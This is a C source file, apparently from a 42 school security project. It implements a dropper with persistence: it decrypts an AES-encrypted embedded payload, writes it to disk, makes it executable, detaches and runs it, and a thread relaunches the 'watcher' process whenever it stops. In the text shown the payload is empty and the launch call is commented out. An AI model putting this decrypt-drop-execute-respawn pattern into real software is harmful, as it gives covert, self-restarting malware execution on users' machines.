/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   process_exists.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/03/20 17:18:39 by jguyet            #+#    #+#             */
/*   Updated: 2018/03/23 06:50:45 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "all.h"

#include <pthread.h>

void start_watcher(t_aes *aes, t_cipher_plain *cipher_plain, char **env)
{
	if (!aes->valid) {
		return;
	}
	char raw[] = "";

	if (set_cipher(cipher_plain, (char*)&raw, sizeof(raw))) {
		if (decrypt_cipher_text(aes, cipher_plain)) {
			FILE *fp = NULL;
			if ((fp = fopen(WATCHER, "wb+")) != NULL) {
				fwrite(cipher_plain->plain, sizeof(char),cipher_plain->plain_len, fp);
				fclose(fp);

				int child_pid = fork();

				if (child_pid == 0)
				{
					setsid();
					chmod(WATCHER, 777);
					char *argv[] = { WATCHER, 0 };
					execve(WATCHER, (char**)&argv[0], env);
				}
			}
		}
	}
}

static BOOL	check_persistent_process_run(void)
{
	char*	process[] = { "watcher", 0 };

	return (processes_exists(process));
}

static BOOL	run_persistent_process(char **env)
{
	t_aes		*aes = NULL;

	if ((aes = load_aes()) != NULL) {
		if (get_key_iv(aes) != NULL && init_encryption(aes)
		 && init_decryption(aes))
		{
			t_cipher_plain *cipher_plain = get_cipher_plain();
			 if (cipher_plain) {
				printf("run_persistent_process(void);\n");
				//start_watcher(aes, cipher_plain, env);
			}
		}
		free_aes(aes);
	}
	return TRUE;
}

static void	*persistent_process(void * p_data)
{
	char **env = (char**)p_data;

	while (1)
	{
		if (check_persistent_process_run() == FALSE)
		{
			run_persistent_process(env);
		}
		usleep(1000);
	}
	return NULL;
}

BOOL		build_persistent_process_thread(char **env)
{
	int			ret;
	pthread_t	thread;

	ret = pthread_create(&thread, NULL, persistent_process, env);

	if (ret)
		return (FALSE);
	return (TRUE);
}
